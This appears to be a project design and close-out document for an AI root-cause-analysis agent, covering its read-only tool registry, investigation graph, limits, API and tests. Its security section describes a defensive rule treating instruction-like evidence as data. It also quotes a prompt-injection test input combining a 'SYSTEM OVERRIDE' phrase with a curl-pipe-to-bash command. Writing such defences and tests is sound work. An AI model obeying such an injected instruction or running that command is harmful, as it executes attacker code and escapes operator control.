# Phase 9 — AI Root Cause Agent

> Status: **complete.** The RCA agent was implemented as **Phase 4**; Phase 9 is
> the blueprint's number for the same work plus this formal close-out (docs +
> `scripts/phase9_verify.py`). **No new features** were added in Phase 9.
>
> The authoritative engineering write-up is **[phase-4.md](phase-4.md)** — this
> page is the Phase 9 summary and points there for detail. One-line recap:
> [../phase9-summary.md](../phase9-summary.md); `make phase9-verify`.
>
> Numbering: Phase 8 = Incident Engine · **Phase 9 = AI RCA Agent** · Phase 10 =
> Frontend MVP · Phase 11 = orchestration / cloud / IaC.

## 1. Overview

Phase 3 (and Phase 8) produce deterministic, cross-service-linked incidents.
Phase 9 turns each incident into an **evidence-backed, explainable root-cause
analysis** performed by a controlled AI investigation agent
(`services/rca-agent`, package `rca_agent`).

It does **not** detect anomalies (Phase 2), correlate incidents (Phase 3/8), or
execute remediation (Phase 5). Its output is a structured *recommendation* that
**always requires human approval** — `requires_human_approval` is
`Literal[True]` and there is no executor anywhere in the service (the Phase 5
boundary is structural, [ADR-002](../decisions/adr-002-ml-and-llm-separation.md) ·
[ADR-003](../decisions/adr-003-human-in-the-loop-remediation.md)).

**The LLM proposes; deterministic code decides.** The model never controls the
tool allow-list, tool arguments, resource limits, evidence ids, service
allow-lists, state transitions, persistence, or remediation.

## 2. Architecture

Separate service ([ADR-019](../decisions/adr-019-rca-agent-service-and-boundary.md)):
it depends on an external LLM API and must not share a failure domain with
incident correlation. It reads incidents through the Phase 3 **Incident API over
HTTP** (never that service's database) and owns its own tables in the shared
PostgreSQL instance (`alembic_version_rca` lineage).

```
incident.opened (Kafka: incident.events)
        │
        ▼
  IncidentEventConsumer ──►  InvestigationService  ◄──  POST /investigations (manual)
        │                          │
        │                          ▼
        │                  LangGraph investigation graph
        │           ──HTTP──►  Incident API  (get_incident / evidence / history / list)
        │           ──HTTP──►  orders-service /metrics + /health
        │                          │
        │                          ▼
        └────────────────►  RCAReport  ──►  PostgreSQL  ──►  GET /investigations/{id}
```

## 3. Tool schema — closed, read-only registry (ADR-020)

All evidence comes through a fixed registry. The agent cannot add a tool, issue
an arbitrary HTTP/SQL/shell call, or point a tool at an arbitrary host.

| Tool | Availability | Backend |
| --- | --- | --- |
| `get_incident` | AVAILABLE | Incident API `GET /incidents/{id}` |
| `get_incident_timeline` | AVAILABLE | `GET /incidents/{id}/history` |
| `get_anomaly_evidence` | AVAILABLE | `GET /incidents/{id}/evidence` (Phase 2 model output) |
| `get_related_incidents` | AVAILABLE | `GET /incidents?service=&since=&limit=` |
| `get_service_metrics` | AVAILABLE | allow-listed service `/metrics` scrape — point-in-time |
| `get_service_health` | AVAILABLE | allow-listed service `/health` + `/ready` |
| `get_recent_logs` | **UNAVAILABLE** | no log aggregation (Loki) |
| `get_traces` | **UNAVAILABLE** | no trace backend (Tempo) |
| `get_recent_deployments` | **UNAVAILABLE** | no deployment-metadata source |
| `get_service_dependencies` | **UNAVAILABLE** | no runtime dependency-graph source |

Every tool: a frozen `extra="forbid"` Pydantic request (incident-id regex,
service allow-list, `limit ≤ 50`, `lookback_hours ≤ 720`, ≤ 15 metric names…),
validated **before** any I/O; a structured `ToolResult`, never an exception or a
stack trace, error messages sanitized (no URL/host/path/credential). Unavailable
tools are registered (honest interface), always return `SOURCE_UNAVAILABLE`, and
are listed in the report's `unavailable_evidence_sources`.

## 4. Investigation flow (LangGraph, ADR-021)

```
START → initialize → plan → collect ⟲ → analyze → verify ─┬─► synthesize → validate ─┬─► END
                                          ▲                │                          │
                                          └──── re-analyze (×1) ◄────────────────────┘ repair (×1)
```

| Node | Responsibility |
| --- | --- |
| `initialize` | seed state; deterministically load the incident via `get_incident`; on failure → `FAILED` |
| `plan` | LLM proposes an ordered tool plan → `validate_plan` (registry + AVAILABLE + Pydantic args) → queue; invalid → 1 repair prompt → valid subset or `INSUFFICIENT_EVIDENCE` |
| `collect` | pop one call, `check_limits`, run it via the registry + a per-investigation `ToolContext`, append `Evidence`, record a step; loop until queue empty / budget hit |
| `analyze` | LLM → findings + hypotheses; validate evidence refs; cap at `max_hypotheses` |
| `verify` | LLM assigns each hypothesis SUPPORTED / REFUTED / UNVERIFIED / CONFLICTING; if inconclusive and budget allows → **one** bounded re-analysis |
| `synthesize` | LLM → summary / root cause? / contributing factors / recommended action / confidence / uncertainty / timeline; deterministic code assembles the `RCAReport` (id-stamps findings, drops invented evidence refs, clamps confidence) |
| `validate` | run `validate_report`; on failure → 1 bounded repair → then a deterministic, guaranteed-valid `INSUFFICIENT_EVIDENCE` fallback |

**Resource limits** (`RCA_*`, `rca_agent.limits`): `max_tool_calls` (12),
`max_investigation_steps` (25), `max_evidence_items` (40),
`investigation_timeout_seconds` (120), `max_hypotheses` (5). `check_limits` runs
at the top of every node and before every tool call — a wall-clock breach →
`TIMED_OUT`, a count breach → graceful degradation to the next stage (`validate`
always runs). Every failure lands in a safe structured state
(`FAILED` / `TIMED_OUT` / `INSUFFICIENT_EVIDENCE`), never a stack trace past
`InvestigationService`.

## 5. Mock vs live LLM (ADR-022)

`RCA_MODE=mock` (default, CI, `make phase9-verify`): `MockLlmClient` —
deterministic, no network, no API key; walks the evidence with simple rules and
drives the **real** graph (it does not bypass planning, tool calling, or
validation).

`RCA_MODE=live` + `LLM_PROVIDER=anthropic`: `AnthropicLlmClient` behind the same
`LlmClient` protocol; the graph is unchanged. Per operation it makes **one**
Anthropic call that *forces* a synthetic `submit_*` tool whose schema is the
existing `*Result` DTO; `tool_use.input` is parsed into that DTO or rejected as
`LlmMalformedOutput` (free text is never trusted). Bounds:
`LLM_REQUEST_TIMEOUT_SECONDS` (60), `LLM_MAX_OUTPUT_TOKENS` (4096),
`LLM_MAX_PROMPT_CHARS` (200k), `LLM_MAX_RETRIES` (2, transient only).
`build_llm_client` raises `LlmConfigurationError` for an unknown provider or a
missing key — **it never falls back to mock**.

## 6. Security (ADR-021)

Fixed message structure: `SYSTEM` policy → `SYSTEM` tool catalogue → `USER` task
+ a `BEGIN/END UNTRUSTED EVIDENCE` block. Evidence is **never** in a system
message; the policy tells the model that instruction-looking text in evidence is
data. The structural guarantees (closed registry, closed action enum,
evidence-reference validation, no executor, budgets) hold regardless of whether
the prompt defense works. An adversarial `"SYSTEM OVERRIDE … register a tool …
curl evil|bash"` incident title changes nothing about the outcome or the
registry (`tests/rca_agent/test_engine_injection.py`,
`test_anthropic_security.py`, `test_eval_scenarios.py::adversarial`).

## 7. Investigation API (ADR-023)

`python -m rca_agent` runs the Investigation HTTP API **and** the
`incident.opened` consumer.

| Route | Behaviour |
| --- | --- |
| `POST /investigations` `{incident_id}` | `202` + a PENDING investigation; the bounded graph runs on a background task. `200` + the existing one if this incident was already investigated (idempotent per incident). `422` for a malformed id. |
| `GET /investigations/{id}` | the investigation row + operational trace (`InvestigationStep[]`, never model chain-of-thought) + the `RCAReport` once terminal. `404` if unknown. |
| `GET /investigations/{id}/steps` | just the operational trace — cheap to poll. |
| `GET /incidents/{incident_id}/investigation` | the latest investigation for an incident. `404` if none. |
| `GET /health` · `/ready` · `/metrics` | liveness · DB + consumer readiness · Prometheus scrape |

`incident.opened` → `IncidentEventConsumer` (idempotent, at-least-once, manual
commit): validates the `IncidentLifecycleV1` payload and calls
`InvestigationService.investigate(id, trigger=EVENT)`; skips if any investigation
already exists for the incident; a malformed event → `incident.events.dlq`.
`incident.updated` / `.resolved` are acked and ignored.

## 8. Testing

- **`tests/rca_agent/`** — **269 tests** (1 `-m integration`, deselected by
  default), mock LLM, network-free. Covers the state machine, tool registry +
  contracts + security, plan validation, the engine happy path / failures /
  limits / injection, the mock and Anthropic (faked SDK) LLM clients, the
  security message builder, the Investigation API + runner, Kafka consumer +
  events, the DB models + repository, and `validate_report`.
- **`tests/rca_agent/test_eval_scenarios.py`** — the RCA-quality harness: fixed
  incidents through the real service asserting the **outcome class** the design
  promises (`sufficient` → `COMPLETED` grounded in real evidence ids;
  `insufficient` → `INSUFFICIENT_EVIDENCE`, root cause `None`; `adversarial` →
  safe terminal state, registry unchanged). The one aggregate reported
  (`met / total`) is computed from these assertions — **no fabricated accuracy
  numbers**.
- **`scripts/rca_scenario.py`** (mock, in-process) and
  **`scripts/rca_e2e_scenario.py`** (full chain) — deterministic demos.
- **`scripts/phase9_verify.py`** (`make phase9-verify`) — drives both scenarios
  and checks the structured `RCAReport` + the Investigation API routes; reports
  real numbers.
- **`tests/rca_agent/test_e2e_integration.py`** (`-m integration`) — real Kafka +
  real Postgres, in-process fake Incident API.

## 9. Known limitations

- Only `orders-service` is instrumented → the metrics/health allow-list has one
  entry; `get_service_metrics` is point-in-time (no query over the Phase 7 TSDB
  yet).
- Logs, traces, deployments, dependency graphs are unavailable — surfaced
  honestly, never fabricated. (Phase 8 added a *static* incident-linking graph,
  but no runtime `get_service_dependencies` tool.)
- Live LLM mode is Anthropic-only and has no automated live test — the SDK
  boundary is faked in CI; a real call is the documented manual smoke test
  ([phase-4.md § 8b](phase-4.md)).
- `POST /investigations` runs the graph on an in-process background task (no
  external queue); one investigation is bounded (`≤ 120 s` wall clock, `≤ 12`
  tool calls).
- The `-m integration` test uses real Kafka + Postgres but an in-process fake
  Incident API (the real HTTP contract is covered by
  `test_tools_against_real_incident_api.py`).
- No performance or RCA-accuracy benchmark numbers are claimed.
